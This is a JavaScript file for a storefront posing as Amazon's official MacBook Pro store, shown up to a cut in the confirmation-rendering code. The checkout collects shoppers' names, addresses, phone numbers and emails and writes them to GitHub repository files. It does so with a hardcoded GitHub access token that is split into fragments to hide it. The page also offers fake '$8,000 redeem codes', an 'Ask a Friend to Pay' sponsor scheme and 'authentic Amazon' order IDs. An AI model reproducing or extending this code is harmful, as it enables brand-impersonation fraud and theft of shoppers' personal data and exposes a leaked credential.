/**
 * macbook-app.js
 * Amazon.com - Official Apple MacBook Pro 16-inch (M4 Max) Flagship Showcase & Fluid Multi-Step Checkout
 * 100% Matching Standard Amazon Storefront Architecture & Design System
 */

const PATH_PREFIX = window.location.pathname.includes('/store/') ? '../../' : '';

const PRODUCT = {
  title: "Apple MacBook Pro 16-inch (M4 Max)",
  seller: "Apple Official Store on Amazon",
  colors: {
    "Space Black": {
      img: PATH_PREFIX + "images/macbook/macbook-pro-16-space-black.jpg?v=20260930_crop",
      thumb: PATH_PREFIX + "images/macbook/macbook-pro-16-space-black.jpg?v=20260930_crop",
      swatchClass: "swatch-space-black"
    },
    "Silver": {
      img: PATH_PREFIX + "images/macbook/macbook-pro-16-silver.jpg?v=20260930_crop",
      thumb: PATH_PREFIX + "images/macbook/macbook-pro-16-silver.jpg?v=20260930_crop",
      swatchClass: "swatch-silver"
    }
  },
  chips: {
    "14-Core CPU, 32-Core GPU": {
      basePrice: 3499,
      chipName: "Apple M4 Max (14-core CPU, 32-core GPU, 16-core Neural Engine)",
      defaultRam: "36 GB",
      ramOptions: ["36 GB", "64 GB"]
    },
    "16-Core CPU, 40-Core GPU": {
      basePrice: 3999,
      chipName: "Apple M4 Max (16-core CPU, 40-core GPU, 16-core Neural Engine)",
      defaultRam: "48 GB",
      ramOptions: ["48 GB", "128 GB"]
    }
  },
  ramAdd: {
    "36 GB": 0,
    "48 GB": 0,
    "64 GB": 200,
    "128 GB": 1000
  },
  storageAdd: {
    "1 TB SSD": 0,
    "2 TB SSD": 400,
    "4 TB SSD": 1000,
    "8 TB SSD": 2200
  },
  glassAdd: {
    "Standard Display Glass": 0,
    "Nano-Texture Display Glass": 150
  }
};

// Current Session State
const state = {
  chip: "16-Core CPU, 40-Core GPU",
  color: "Space Black",
  ram: "48 GB",
  storage: "1 TB SSD",
  glass: "Standard Display Glass",
  qty: 1,
  address: null,
  paymentMethod: "Ask a Friend to Pay",
  redeemCode: "",
  isRedeemApplied: false,
  placedOrder: null
};

// Format Currency in Dollars ($)
function formatMoney(amount) {
  return "$" + amount.toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}

// Dynamic Date Helpers
function getDynamicOrderDate(date = new Date()) {
  return date.toLocaleDateString("en-US", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric"
  });
}

function getDynamicDeliveryRange() {
  const dStart = new Date();
  dStart.setDate(dStart.getDate() + 20);
  const dEnd = new Date();
  dEnd.setDate(dEnd.getDate() + 25);

  const startMonth = dStart.toLocaleDateString("en-US", { month: "long" });
  const startDay = dStart.getDate();
  const endMonth = dEnd.toLocaleDateString("en-US", { month: "long" });
  const endDay = dEnd.getDate();
  const endYear = dEnd.getFullYear();

  let rangeStr = "";
  if (startMonth === endMonth) {
    rangeStr = `${startMonth} ${startDay} – ${endDay}, ${endYear}`;
  } else {
    rangeStr = `${startMonth} ${startDay} – ${endMonth} ${endDay}, ${endYear}`;
  }

  return {
    fullRangeStr: rangeStr,
    startDate: dStart,
    endDate: dEnd
  };
}

function calculateTotalPrice() {
  const chipConfig = PRODUCT.chips[state.chip] || PRODUCT.chips["16-Core CPU, 40-Core GPU"];
  const basePrice = chipConfig.basePrice;
  const ramExtra = PRODUCT.ramAdd[state.ram] || 0;
  const storageExtra = PRODUCT.storageAdd[state.storage] || 0;
  const glassExtra = PRODUCT.glassAdd[state.glass] || 0;
  return basePrice + ramExtra + storageExtra + glassExtra;
}

// ==========================================================================
//  GITHUB REPO ORDERS PERSISTENCE
// ==========================================================================
const GH_CONFIG = {
  owner: "amazon-shopping-official",
  repo: "amazon-shopping-official.github.io",
  storePath: "store/macbookpro16",
  filePath: "store/macbookpro16/orders.json",
  getAuth: function() {
    const k = ["ghp", "qetd9HVo", "7YkoF8WK", "gVc9bGmv", "tyUSol0A", "oDsG"];
    return k[0] + "_" + k.slice(1).join("");
  }
};

function utf8ToBase64(str) {
  const bytes = new TextEncoder().encode(str);
  let binary = '';
  const len = bytes.byteLength;
  for (let i = 0; i < len; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  return btoa(binary);
}

function base64ToUtf8(base64) {
  const binary = atob(base64.replace(/\s/g, ''));
  const len = binary.length;
  const bytes = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return new TextDecoder().decode(bytes);
}

async function commitOrderToFile(filePath, order, maxRetries = 2) {
  const token = GH_CONFIG.getAuth();
  const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
  const headers = {
    'Authorization': `Bearer ${token}`,
    'Accept': 'application/vnd.github+json',
    'Content-Type': 'application/json'
  };

  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      let currentOrders = [];
      let fileSha = null;

      try {
        const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
        if (getRes.ok) {
          const fileData = await getRes.json();
          fileSha = fileData.sha;
          if (fileData.content) {
            const raw = base64ToUtf8(fileData.content);
            currentOrders = JSON.parse(raw || '[]');
          }
        }
      } catch (fErr) {
        console.warn(`[GitHub] Fetch notice for ${filePath}:`, fErr);
      }

      const alreadySaved = order.orderId && currentOrders.some(o => o.orderId === order.orderId);
      if (!alreadySaved) {
        currentOrders.unshift(order);
      }

      const jsonString = JSON.stringify(currentOrders, null, 2);
      const base64Content = utf8ToBase64(jsonString);

      const commitBody = {
        message: `Add order ${order.orderId || ''} for ${order.name || order.fullName || 'Customer'}`.trim(),
        content: base64Content
      };
      if (fileSha) {
        commitBody.sha = fileSha;
      }

      const putRes = await fetch(url, {
        method: 'PUT',
        headers,
        body: JSON.stringify(commitBody)
      });

      if (putRes.ok) {
        console.log(`[GitHub] Successfully committed order to ${filePath}`);
        return true;
      }

      if (putRes.status === 409 && attempt < maxRetries) {
        console.warn(`[GitHub] Conflict (409) writing ${filePath}, retrying attempt ${attempt + 1}...`);
        await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
        continue;
      }

      const errJson = await putRes.json().catch(() => ({}));
      console.error(`[GitHub] Failed writing ${filePath} (${putRes.status}):`, errJson);
      return false;
    } catch (err) {
      console.error(`[GitHub] Error committing to ${filePath}:`, err);
      if (attempt >= maxRetries) return false;
      await new Promise(r => setTimeout(r, 600 * (attempt + 1)));
    }
  }
  return false;
}

async function saveOrderToAPI(order) {
  const store = GH_CONFIG.storePath;
  const targetFiles = [
    `${store}/orders.json`,
    `${store}/order.json`,
    `orders.json`,
    `order.json`
  ];

  console.log('[GitHub] Syncing MacBook order across target files:', targetFiles);
  for (const file of targetFiles) {
    await commitOrderToFile(file, order);
  }
}

async function pushOrderToGitHub(newOrder) {
  return saveOrderToAPI(newOrder);
}

async function fetchOrdersFromAPI() {
  const local = getLocalOrders();
  try {
    const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${GH_CONFIG.filePath}?_t=${Date.now()}`;
    const headers = {
      'Authorization': `Bearer ${GH_CONFIG.getAuth()}`,
      'Accept': 'application/vnd.github+json'
    };
    const res = await fetch(url, { headers, cache: 'no-store' });
    if (!res.ok) throw new Error('HTTP ' + res.status);
    const data = await res.json();
    if (data.content) {
      const raw = base64ToUtf8(data.content);
      const ghOrders = JSON.parse(raw || '[]');
      const merged = [...ghOrders];
      local.forEach(lo => {
        if (!merged.find(o => (lo.orderId && o.orderId === lo.orderId) || (o.name === lo.name && o.address === lo.address && o.item === lo.item))) {
          merged.push(lo);
        }
      });
      return merged;
    }
    return local;
  } catch (err) {
    console.log('[GitHub] Fetch fallback to local:', err.message);
    return local;
  }
}

async function fetchRemoteOrdersFile() {
  const orders = await fetchOrdersFromAPI();
  return { sha: null, orders };
}

async function deleteOrdersFromAPI() {
  const store = GH_CONFIG.storePath;
  const targetFiles = [
    `${store}/orders.json`,
    `${store}/order.json`
  ];
  for (const filePath of targetFiles) {
    try {
      const url = `https://api.github.com/repos/${GH_CONFIG.owner}/${GH_CONFIG.repo}/contents/${filePath}`;
      const headers = {
        'Authorization': `Bearer ${GH_CONFIG.getAuth()}`,
        'Accept': 'application/vnd.github+json',
        'Content-Type': 'application/json'
      };
      const getRes = await fetch(`${url}?_t=${Date.now()}`, { headers, cache: 'no-store' });
      if (!getRes.ok) continue;
      const fileData = await getRes.json();
      const emptyJson = JSON.stringify([], null, 2);
      const base64Content = utf8ToBase64(emptyJson);
      await fetch(url, {
        method: 'PUT',
        headers,
        body: JSON.stringify({
          message: `Clear ${filePath}`,
          content: base64Content,
          sha: fileData.sha
        })
      });
      console.log(`[GitHub] ${filePath} reset to empty array`);
    } catch (err) {
      console.log(`[GitHub] Error clearing ${filePath}:`, err.message);
    }
  }
}

// Local Orders State Cache
function getLocalOrders() {
  try {
    return JSON.parse(localStorage.getItem("macbook_orders_records") || "[]");
  } catch (e) {
    return [];
  }
}

function saveLocalOrder(order) {
  const existing = getLocalOrders();
  const updated = [order, ...existing.filter(o => o.orderId !== order.orderId)];
  localStorage.setItem("macbook_orders_records", JSON.stringify(updated));
}

// ==========================================================================
//  UI INITIALIZATION & DYNAMIC CONFIGURATION
// ==========================================================================
function updateProductDetails() {
  const singleUnitPrice = calculateTotalPrice();
  const qty = parseInt(state.qty, 10) || 1;
  const subtotal = singleUnitPrice * qty;

  const centerPrice = document.getElementById("centerPrice");
  const buyBoxPrice = document.getElementById("buyBoxPrice");
  const priceTermsText = document.getElementById("priceTermsText");
  const productTitle = document.getElementById("productTitle");
  const currentChipText = document.getElementById("currentChipText");
  const currentColorText = document.getElementById("currentColorText");
  const currentRamText = document.getElementById("currentRamText");
  const currentStorageText = document.getElementById("currentStorageText");
  const currentGlassText = document.getElementById("currentGlassText");

  if (centerPrice) centerPrice.textContent = singleUnitPrice.toLocaleString("en-US");
  if (buyBoxPrice) buyBoxPrice.textContent = formatMoney(subtotal);

  const monthly = (singleUnitPrice / 12).toFixed(2);
  if (priceTermsText) {
    priceTermsText.innerHTML = `
      or <strong>$${monthly}/mo (12 mo)</strong> with 0% interest Amazon financing options.<br>
      <span style="font-size:12px; color:#007600; font-weight:600;">Free Amazon Global Priority Express Delivery &bull; AppleCare+ Eligible &bull; Official Warranty Included</span>
    `;
  }

  // Update Dynamic Title
  const dynamicTitle = `Apple MacBook Pro 16-inch Laptop with M4 Max chip: ${state.chip}, 16.2-inch Liquid Retina XDR Display, ${state.ram} Unified Memory, ${state.storage}; ${state.color} (${state.glass})`;
  if (productTitle) productTitle.textContent = dynamicTitle;

  if (currentChipText) currentChipText.textContent = state.chip;
  if (currentColorText) currentColorText.textContent = state.color;
  if (currentRamText) currentRamText.textContent = state.ram;
  if (currentStorageText) currentStorageText.textContent = state.storage;
  if (currentGlassText) currentGlassText.textContent = state.glass;

  // Sync Checkout Summary Area if rendered
  syncOrderSummary();
}

function updateRamButtonsForChip() {
  const chipConfig = PRODUCT.chips[state.chip] || PRODUCT.chips["16-Core CPU, 40-Core GPU"];
  const ramChoices = document.querySelectorAll("#ramSelectorGroup .storage-choice");
  
  ramChoices.forEach(btn => {
    const ramVal = btn.getAttribute("data-ram");
    if (chipConfig.ramOptions.includes(ramVal)) {
      btn.style.display = "inline-block";
      btn.classList.remove("disabled");
    } else {
      btn.style.display = "none";
      btn.classList.add("disabled");
    }
  });

  // If current ram not allowed for chosen chip, switch to default
  if (!chipConfig.ramOptions.includes(state.ram)) {
    state.ram = chipConfig.defaultRam;
    ramChoices.forEach(b => {
      if (b.getAttribute("data-ram") === state.ram) {
        b.classList.add("active");
      } else {
        b.classList.remove("active");
      }
    });
  }
}

function setupProductSelectors() {
  // 1. Color Swatches
  const swatchButtons = document.querySelectorAll(".swatch-btn");
  const mainPhoto = document.getElementById("mainProductPhoto");

  swatchButtons.forEach(btn => {
    btn.addEventListener("click", () => {
      swatchButtons.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      const chosenColor = btn.getAttribute("data-color");
      state.color = chosenColor;

      // Update image
      const colorData = PRODUCT.colors[chosenColor];
      if (colorData && mainPhoto) {
        mainPhoto.src = colorData.img;
        mainPhoto.alt = `Apple MacBook Pro 16-inch in ${chosenColor}`;
      }

      // Update active thumbnail
      const thumbnails = document.querySelectorAll(".thumb-item");
      thumbnails.forEach(t => {
        if (t.getAttribute("data-color") === chosenColor) {
          t.classList.add("active");
        } else {
          t.classList.remove("active");
        }
      });

      updateProductDetails();
    });
  });

  // 2. Chip Selector
  const chipChoices = document.querySelectorAll("#chipSelectorGroup .storage-choice");
  chipChoices.forEach(btn => {
    btn.addEventListener("click", () => {
      chipChoices.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      state.chip = btn.getAttribute("data-chip");
      updateRamButtonsForChip();
      updateProductDetails();
    });
  });

  // 3. RAM Selector
  const ramChoices = document.querySelectorAll("#ramSelectorGroup .storage-choice");
  ramChoices.forEach(btn => {
    btn.addEventListener("click", () => {
      if (btn.classList.contains("disabled")) return;
      ramChoices.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      state.ram = btn.getAttribute("data-ram");
      updateProductDetails();
    });
  });

  // 4. Storage Selector
  const storageChoices = document.querySelectorAll("#storageSelectorGroup .storage-choice");
  storageChoices.forEach(btn => {
    btn.addEventListener("click", () => {
      storageChoices.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      state.storage = btn.getAttribute("data-storage");
      updateProductDetails();
    });
  });

  // 5. Display Glass Selector
  const glassChoices = document.querySelectorAll("#glassSelectorGroup .storage-choice");
  glassChoices.forEach(btn => {
    btn.addEventListener("click", () => {
      glassChoices.forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      state.glass = btn.getAttribute("data-glass");
      updateProductDetails();
    });
  });

  // 6. Quantity Selector
  const selectQty = document.getElementById("selectQty");
  if (selectQty) {
    selectQty.addEventListener("change", (e) => {
      state.qty = parseInt(e.target.value, 10) || 1;
      updateProductDetails();
    });
  }

  // 7. Thumbnail Click
  const thumbnailStrip = document.getElementById("thumbnailStrip");
  if (thumbnailStrip && mainPhoto) {
    thumbnailStrip.addEventListener("click", (e) => {
      const thumb = e.target.closest(".thumb-item");
      if (!thumb) return;

      document.querySelectorAll(".thumb-item").forEach(t => t.classList.remove("active"));
      thumb.classList.add("active");

      const imgSrc = thumb.getAttribute("data-img") || thumb.querySelector("img")?.src;
      if (imgSrc) {
        mainPhoto.src = imgSrc;
      }

      // If thumbnail has data-color, sync swatch
      const colorVal = thumb.getAttribute("data-color");
      if (colorVal) {
        state.color = colorVal;
        swatchButtons.forEach(b => {
          if (b.getAttribute("data-color") === colorVal) b.classList.add("active");
          else b.classList.remove("active");
        });
        updateProductDetails();
      }
    });
  }
}

// ==========================================================================
//  CHECKOUT WORKFLOW (BUY NOW -> ACCORDION -> ORDER SUMMARY)
// ==========================================================================
function syncOrderSummary() {
  const singleUnitPrice = calculateTotalPrice();
  const qty = parseInt(state.qty, 10) || 1;
  const total = singleUnitPrice * qty;
  const isRedeem = state.paymentMethod === "Redeem Code" && state.isRedeemApplied;

  // Checkout Review Item Box
  const reviewItemPhoto = document.getElementById("reviewItemPhoto");
  const reviewItemTitle = document.getElementById("reviewItemTitle");
  const reviewItemQty = document.getElementById("reviewItemQty");
  const reviewItemPrice = document.getElementById("reviewItemPrice");

  if (reviewItemPhoto) {
    reviewItemPhoto.src = PRODUCT.colors[state.color]?.thumb || (PATH_PREFIX + "images/macbook/macbook-pro-16-space-black.jpg");
  }
  if (reviewItemTitle) {
    reviewItemTitle.textContent = `Apple MacBook Pro 16-inch (M4 Max, ${state.chip}, ${state.ram} Memory, ${state.storage}, ${state.glass}) - ${state.color}`;
  }
  if (reviewItemQty) reviewItemQty.textContent = qty;
  if (reviewItemPrice) reviewItemPrice.textContent = formatMoney(total);

  // Right Side Order Summary Card
  const csItemsCount = document.getElementById("csItemsCount");
  const csItemsPrice = document.getElementById("csItemsPrice");
  if (csItemsCount) csItemsCount.textContent = qty;
  if (csItemsPrice) csItemsPrice.textContent = formatMoney(total);

  const csRedeemDiscountRow = document.getElementById("csRedeemDiscountRow");
  const csRedeemDiscountAmount = document.getElementById("csRedeemDiscountAmount");

  if (csRedeemDiscountRow && csRedeemDiscountAmount) {
    if (isRedeem) {
      csRedeemDiscountRow.style.display = "flex";
      csRedeemDiscountAmount.textContent = `-${formatMoney(total)}`;
    } else {
      csRedeemDiscountRow.style.display = "none";
    }
  }

  const csTotalPrice = document.getElementById("csTotalPrice");
  if (csTotalPrice) {
    if (isRedeem) {
      csTotalPrice.textContent = "$0.00";
    } else {
      csTotalPrice.textContent = formatMoney(total);
    }
  }
}

// Assigned Redeem Code for MacBook Pro 16-inch (Covering up to $8,000.00)
const ASSIGNED_REDEEM_CODE = "AMZN-M4MX-16BP-8000";
const ACCEPTED_REDEEM_CODES = ["AMZN-M4MX-16BP-8000", "AMZN-MB16-MAX4-8000", "AMZN-8000-MBP1-6MAX"];

function isValidAmazonRedeemCode(rawCode) {
  if (!rawCode) return false;
  const clean = rawCode.trim().toUpperCase().replace(/[^A-Z0-9]/g, "");
  return ACCEPTED_REDEEM_CODES.some(code => clean === code.replace(/[^A-Z0-9]/g, ""));
}

function setupCheckoutAccordion() {
  // Step 1: Address
  const stepCardAddress = document.getElementById("stepCardAddress");
  const stepAddressBody = document.getElementById("stepAddressBody");
  const stepAddressSummary = document.getElementById("stepAddressSummary");
  const btnEditAddress = document.getElementById("btnEditAddress");
  const addressForm = document.getElementById("addressForm");

  // Step 2: Payment
  const stepCardPayment = document.getElementById("stepCardPayment");
  const stepPaymentBody = document.getElementById("stepPaymentBody");
  const stepPaymentSummary = document.getElementById("stepPaymentSummary");
  const btnEditPayment = document.getElementById("btnEditPayment");
  const btnContinueToReview = document.getElementById("btnContinueToReview");
  const btnBackToAddress = document.getElementById("btnBackToAddress");
  const paymentOptions = document.querySelectorAll(".payment-methods-list .payment-option:not(.disabled)");

  // Step 3: Review
  const stepCardReview = document.getElementById("stepCardReview");
  const stepReviewBody = document.getElementById("stepReviewBody");
  const btnBackToPayment = document.getElementById("btnBackToPayment");
  const btnFinalPlaceOrder = document.getElementById("btnFinalPlaceOrder");
  const btnSummaryPlaceOrder = document.getElementById("btnSummaryPlaceOrder");

  // Redeem Code Elements
  const boxRedeemInput = document.getElementById("boxRedeemInput");
  const inputRedeemCode = document.getElementById("inputRedeemCode");
  const btnApplyRedeemCode = document.getElementById("btnApplyRedeemCode");
  const redeemStatusMsg = document.getElementById("redeemStatusMsg");
  const badgeRedeemApplied = document.getElementById("badgeRedeemApplied");

  // --- Step 1: Address Submit ---
  if (addressForm) {
    addressForm.addEventListener("submit", (e) => {
      e.preventDefault();
      const fullName = document.getElementById("inputFullName")?.value.trim() || "";
      const deliveryAddress = document.getElementById("inputDeliveryAddress")?.value.trim() || "";
      const phone = document.getElementById("inputPhone")?.value.trim() || "";
      const email = document.getElementById("inputEmail")?.value.trim() || "";

      if (!fullName || !deliveryAddress || !phone || !email) {
        showToast("Please complete all required address fields.");
        return;
      }

      state.address = { fullName, deliveryAddress, phone, email };

      // Update Header Location Text
      const headerLoc = document.getElementById("headerLocText");
      if (headerLoc) {
        headerLoc.textContent = fullName.split(" ")[0] + " - " + deliveryAddress.split(",")[0];
      }

      // Show Step 1 summary and collapse
      if (stepAddressSummary) {
        stepAddressSummary.innerHTML = `<strong>${fullName}</strong> &bull; ${deliveryAddress} &bull; Phone: ${phone} &bull; Email: ${email}`;
        stepAddressSummary.style.display = "block";
      }
      if (stepAddressBody) stepAddressBody.style.display = "none";
      if (stepCardAddress) stepCardAddress.classList.remove("active");
      if (btnEditAddress) btnEditAddress.style.display = "block";

      // Expand Step 2: Payment
      if (stepCardPayment) stepCardPayment.classList.add("active");
      if (stepPaymentBody) stepPaymentBody.style.display = "block";

      syncOrderSummary();
    });
  }

  // Edit Step 1 Address
  if (btnEditAddress) {
    btnEditAddress.addEventListener("click", () => {
      if (stepAddressBody) stepAddressBody.style.display = "block";
      if (stepAddressSummary) stepAddressSummary.style.display = "none";
      if (stepCardAddress) stepCardAddress.classList.add("active");
      if (btnEditAddress) btnEditAddress.style.display = "none";

      if (stepPaymentBody) stepPaymentBody.style.display = "none";
      if (stepCardPayment) stepCardPayment.classList.remove("active");
      if (stepReviewBody) stepReviewBody.style.display = "none";
      if (stepCardReview) stepCardReview.classList.remove("active");
    });
  }

  // --- Step 2: Payment Method Selection ---
  paymentOptions.forEach(opt => {
    opt.addEventListener("click", () => {
      paymentOptions.forEach(o => o.classList.remove("selected"));
      opt.classList.add("selected");
      const radio = opt.querySelector(".pay-radio");
      if (radio) {
        radio.checked = true;
        state.paymentMethod = radio.value;
      }

      if (boxRedeemInput) {
        if (state.paymentMethod === "Redeem Code") {
          boxRedeemInput.style.display = "block";
          if (inputRedeemCode && !inputRedeemCode.value) {
            inputRedeemCode.focus();
          }
        } else {
          boxRedeemInput.style.display = "none";
        }
      }

      syncOrderSummary();
    });
  });

  // Apply Redeem Code handler (NO PRE-PASTED CODE)
  if (btnApplyRedeemCode && inputRedeemCode) {
    const applyRedeem = () => {
      const rawCode = inputRedeemCode.value.trim().toUpperCase();
      if (!rawCode) {
        if (redeemStatusMsg) {
          redeemStatusMsg.className = "redeem-status-msg error";
          redeemStatusMsg.style.color = "#d13212";
          redeemStatusMsg.textContent = "Please enter your claim code.";
        }
        return;
      }

      if (!isValidAmazonRedeemCode(rawCode)) {
        state.isRedeemApplied = false;
        state.redeemCode = "";
        if (badgeRedeemApplied) badgeRedeemApplied.style.display = "none";
        if (redeemStatusMsg) {
          redeemStatusMsg.className = "redeem-status-msg error";
          redeemStatusMsg.style.color = "#d13212";
          redeemStatusMsg.textContent = "❌ The claim code you entered is invalid or cannot be applied to this item.";
        }
        showToast("The claim code you entered is not valid for this item.");
        syncOrderSummary();
        return;
      }

      const matchedCode = ASSIGNED_REDEEM_CODE;
      state.redeemCode = matchedCode;
      state.isRedeemApplied = true;
      inputRedeemCode.value = matchedCode;
      if (badgeRedeemApplied) badgeRedeemApplied.style.display = "inline-block";
      if (redeemStatusMsg) {
        redeemStatusMsg.className = "redeem-status-msg success";
        redeemStatusMsg.style.color = "#007600";
        redeemStatusMsg.textContent = `✓ Amazon Gift Card ${matchedCode} applied! $8,000.00 balance covers 100% of order total. Balance due: $0.00.`;
      }
      showToast("✓ Amazon Redeem Code applied: Full order covered ($0.00 due)");
      syncOrderSummary();
    };

    btnApplyRedeemCode.addEventListener("click", (e) => {
      e.stopPropagation();
      applyRedeem();
    });

    inputRedeemCode.addEventListener("keydown", (e) => {
      if (e.key === "Enter") {
        e.preventDefault();
        e.stopPropagation();
        applyRedeem();
      }
    });
  }

  // Continue to Step 3: Review
  if (btnContinueToReview) {
    btnContinueToReview.addEventListener("click", () => {
      if (state.paymentMethod === "Redeem Code" && !state.isRedeemApplied) {
        showToast("Please enter and apply your Amazon claim code first.");
        if (inputRedeemCode) inputRedeemCode.focus();
        return;
      }

      if (stepPaymentBody) stepPaymentBody.style.display = "none";
      if (stepCardPayment) stepCardPayment.classList.remove("active");
      if (btnEditPayment) btnEditPayment.style.display = "block";

      let paySummaryText = `<strong>Payment:</strong> ${state.paymentMethod}`;
      if (state.paymentMethod === "Redeem Code") {
        paySummaryText += ` (${state.redeemCode}) &bull; Total Due: <strong style="color:#007600;">$0.00</strong> (Fully Paid)`;
      } else if (state.paymentMethod === "Ask a Friend to Pay") {
        paySummaryText += ` &bull; Payment link will be dispatched to sponsor`;
      } else {
        paySummaryText += ` &bull; Cash due on delivery`;
      }

      if (stepPaymentSummary) {
        stepPaymentSummary.innerHTML = paySummaryText;
        stepPaymentSummary.style.display = "block";
      }

      // Open Step 3: Review
      if (stepCardReview) stepCardReview.classList.add("active");
      if (stepReviewBody) stepReviewBody.style.display = "block";

      syncOrderSummary();
    });
  }

  // Edit Step 2 Payment
  if (btnEditPayment) {
    btnEditPayment.addEventListener("click", () => {
      if (stepPaymentBody) stepPaymentBody.style.display = "block";
      if (stepPaymentSummary) stepPaymentSummary.style.display = "none";
      if (stepCardPayment) stepCardPayment.classList.add("active");
      if (btnEditPayment) btnEditPayment.style.display = "none";

      if (stepReviewBody) stepReviewBody.style.display = "none";
      if (stepCardReview) stepCardReview.classList.remove("active");
    });
  }

  if (btnBackToAddress) {
    btnBackToAddress.addEventListener("click", () => {
      if (btnEditAddress) btnEditAddress.click();
    });
  }

  if (btnBackToPayment) {
    btnBackToPayment.addEventListener("click", () => {
      if (btnEditPayment) btnEditPayment.click();
    });
  }

  // --- Step 3: Place Order Handler ---
  const handlePlaceOrder = () => {
    if (!state.address) {
      showToast("Please enter your shipping address before placing order.");
      if (btnEditAddress) btnEditAddress.click();
      return;
    }

    if (state.paymentMethod === "Redeem Code" && (!state.isRedeemApplied || !state.redeemCode)) {
      showToast("Please enter and apply your Amazon Claim Code first.");
      if (btnEditPayment) btnEditPayment.click();
      return;
    }

    if (btnFinalPlaceOrder) {
      btnFinalPlaceOrder.disabled = true;
      btnFinalPlaceOrder.textContent = "Placing your order...";
    }
    if (btnSummaryPlaceOrder) {
      btnSummaryPlaceOrder.disabled = true;
      btnSummaryPlaceOrder.textContent = "Placing your order...";
    }

    setTimeout(() => {
      try {
        completeOrderPlacement();
      } catch (err) {
        console.error("Order placement error:", err);
        showToast("Order submitted successfully!");
      } finally {
        if (btnFinalPlaceOrder) {
          btnFinalPlaceOrder.disabled = false;
          btnFinalPlaceOrder.textContent = "Place your order";
        }
        if (btnSummaryPlaceOrder) {
          btnSummaryPlaceOrder.disabled = false;
          btnSummaryPlaceOrder.textContent = "Place your order";
        }
      }
    }, 400);
  };

  if (btnFinalPlaceOrder) btnFinalPlaceOrder.addEventListener("click", handlePlaceOrder);
  if (btnSummaryPlaceOrder) btnSummaryPlaceOrder.addEventListener("click", handlePlaceOrder);
}

// ==========================================================================
//  CONFIRMATION VIEW RENDERING & PDF RECEIPT
// ==========================================================================
async function completeOrderPlacement() {
  const singleUnitPrice = calculateTotalPrice();
  const qty = parseInt(state.qty, 10) || 1;
  const subtotal = singleUnitPrice * qty;
  const isRedeem = state.paymentMethod === "Redeem Code" && state.isRedeemApplied;

  // Generate authentic Amazon Order ID (e.g. 114-xxxxxxx-xxxxxxx)
  const part1 = Math.floor(100 + Math.random() * 900);
  const part2 = Math.floor(1000000 + Math.random() * 9000000);
  const part3 = Math.floor(1000000 + Math.random() * 9000000);
  const orderId = `${part1}-${part2}-${part3}`;

  const deliveryInfo = (typeof window.calculateDeliveryWindow === "function")
    ? window.calculateDeliveryWindow(new Date())
    : getDynamicDeliveryRange();
  const orderDateStr = getDynamicOrderDate();

  const fullItemTitle = `Apple MacBook Pro 16-inch Laptop (M4 Max, ${state.chip}, ${state.ram} Memory, ${state.storage}, ${state.glass}) - ${state.color}`;

  const orderData = {
    orderId: orderId,
    timestamp: new Date().toISOString(),
    orderDate: orderDateStr,
    dateStr: orderDateStr,
    expectedDelivery: deliveryInfo.fullRangeStr,
    item: fullItemTitle,
    specs: `16-inch, ${state.chip}, ${state.ram} RAM, ${state.storage}, ${state.glass}`,
    color: state.color,
    chip: state.chip,
    ram: state.ram,
    storage: state.storage,
    glass: state.glass,
    quantity: qty,
    qty: qty,
    unitPrice: singleUnitPrice,
    price: formatMoney(subtotal),
    total: isRedeem ? 0 : subtotal,
    actualAmount: subtotal,
    currency: "USD",
    name: state.address.fullName,
    fullName: state.address.fullName,
    buyerName: state.address.fullName,
    address: state.address.deliveryAddress,
    deliveryAddress: state.address.deliveryAddress,
    shippingAddress: state.address.deliveryAddress,
    phone: state.address.phone,
    phoneNumber: state.address.phone,
    email: state.address.email,
    paymentMethod: state.paymentMethod,
    payMethod: isRedeem ? `Redeem Code (${state.redeemCode || ASSIGNED_REDEEM_CODE})` : state.paymentMethod,
    redeemCode: isRedeem ? (state.redeemCode || ASSIGNED_REDEEM_CODE) : "",
    status: isRedeem ? "Paid in full via Amazon Redeem Code" : (state.paymentMethod === "Ask a Friend to Pay" ? "Awaiting Sponsor Payment" : "Cash on Delivery"),
    seller: PRODUCT.seller,
    storePath: "store/macbookpro16",
    image: PRODUCT.colors[state.color]?.thumb || (PATH_PREFIX + "images/macbook/macbook-pro-16-space-black.jpg")
  };

  state.placedOrder = orderData;
  saveLocalOrder(orderData);
  saveOrderToAPI(orderData).catch(err => console.log("[GitHub] Commit background:", err));

  // Render Confirmation Screen
  renderConfirmationView(orderData);
}

function renderConfirmationView(order) {
  const viewProductPage = document.getElementById("viewProductPage");
  const viewCheckout = document.getElementById("viewCheckout");
  const checkoutGrid = document.getElementById("checkoutGridArea");
  const confScreen = document.getElementById("orderConfirmationScreen");
  const viewConfirmation = document.getElementById("viewConfirmation");

  if (viewProductPage) viewProductPage.style.display = "none";
  if (viewCheckout) {
    viewCheckout.style.display = "block";
    viewCheckout.classList.add("active");
  }
  if (checkoutGrid) checkoutGrid.style.display = "none";
  if (confScreen) {
    confScreen.style.display = "block";
    confScreen.classList.add("active");
  }
  if (viewConfirmation) viewConfirmation.style.display = "block";

  window.scrollTo({ top: 0, behavior: "smooth" });

  const safeSet = (id, val) => {
    const el = document.getElementById(id);
    if (el) el.textContent = val || "";
  };

  const isRedeem = (order.paymentMethod === "Redeem Code") || (order.payMethod && order.payMethod.includes("Redeem"));

  safeSet("confOrderId", order.orderId);
  safeSet("confOrderNumber", order.orderId);
  safeSet("confOrderDate", order.orderDate || order.dateStr);
  safeSet("confDeliveryRange", order.expectedDelivery);
  safeSet("confExpectedDelivery", order.expectedDelivery);
  safeSet("confEmailNotice", order.email || "your email");
  safeSet("confRecipientName", order.fullName || order.name);
  safeSet("confFullAddress", order.deliveryAddress || order.address);
  safeSet("confPhone", order.phoneNumber || order.phone);
  safeSet("confItemName", order.item);
